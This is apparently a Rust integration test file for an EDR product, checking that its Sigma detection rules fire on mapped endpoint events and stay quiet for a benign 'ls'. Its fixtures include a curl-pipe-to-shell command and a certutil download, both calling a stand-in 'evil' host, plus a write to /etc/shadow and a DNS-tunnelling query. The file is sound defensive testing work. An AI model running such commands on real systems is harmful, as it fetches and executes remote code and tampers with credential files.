//! Verify the shipped EDR Sigma rules fire against telemetry mapped through
//! `map::to_event` — end-to-end coverage of the mapping + detection contract.

use sigil_edr::map;
use sigil_edr_proto::pb;
use sigil_sigma::SigmaEngine;

fn engine() -> SigmaEngine {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../configs/rules/edr");
    let (engine, report) = SigmaEngine::load_dir(&dir).expect("load edr rules");
    assert!(
        report.failed.is_empty(),
        "some EDR rules failed to compile: {:?}",
        report.failed
    );
    assert_eq!(engine.len(), 10, "expected 10 EDR rules");
    engine
}

fn ev(kind: pb::EventKind, e: pb::EndpointEvent) -> sigil_core::Event {
    let mut e = e;
    e.kind = kind as i32;
    map::to_event("agent-1", "host-a", "acme", &e)
}

fn fired(engine: &SigmaEngine, event: &sigil_core::Event) -> Vec<String> {
    engine.eval(event).into_iter().map(|a| a.rule_id).collect()
}

#[test]
fn curl_pipe_shell_fires() {
    let engine = engine();
    let event = ev(
        pb::EventKind::ProcessStart,
        pb::EndpointEvent {
            process: Some(pb::Process {
                name: "bash".into(),
                cmdline: "bash -c 'curl http://evil/x.sh | sh'".into(),
                ..Default::default()
            }),
            ..Default::default()
        },
    );
    assert!(
        fired(&engine, &event)
            .iter()
            .any(|r| r == "edr-0004-curl-pipe-shell"),
        "curl-pipe-shell rule should fire"
    );
}

#[test]
fn credential_file_access_fires() {
    let engine = engine();
    let event = ev(
        pb::EventKind::FileModify,
        pb::EndpointEvent {
            file: Some(pb::FileInfo {
                path: "/etc/shadow".into(),
                ..Default::default()
            }),
            ..Default::default()
        },
    );
    assert!(fired(&engine, &event)
        .iter()
        .any(|r| r == "edr-0003-cred-file-access"));
}

#[test]
fn lolbin_execution_fires() {
    let engine = engine();
    let event = ev(
        pb::EventKind::ProcessStart,
        pb::EndpointEvent {
            process: Some(pb::Process {
                name: "certutil.exe".into(),
                cmdline: "certutil -urlcache -f http://evil/x.exe".into(),
                ..Default::default()
            }),
            ..Default::default()
        },
    );
    assert!(fired(&engine, &event)
        .iter()
        .any(|r| r == "edr-0010-lolbin-exec"));
}

#[test]
fn dns_long_query_fires() {
    let engine = engine();
    let long = format!("{}.tunnel.example.com", "a".repeat(60));
    let event = ev(
        pb::EventKind::DnsQuery,
        pb::EndpointEvent {
            dns: Some(pb::DnsInfo {
                query: long,
                qtype: "A".into(),
                answers: vec![],
            }),
            ..Default::default()
        },
    );
    assert!(fired(&engine, &event)
        .iter()
        .any(|r| r == "edr-0009-dns-tunneling"));
}

#[test]
fn benign_process_does_not_fire() {
    let engine = engine();
    let event = ev(
        pb::EventKind::ProcessStart,
        pb::EndpointEvent {
            process: Some(pb::Process {
                name: "ls".into(),
                cmdline: "ls -la".into(),
                ..Default::default()
            }),
            ..Default::default()
        },
    );
    assert!(
        fired(&engine, &event).is_empty(),
        "benign `ls` should not trigger any EDR rule"
    );
}
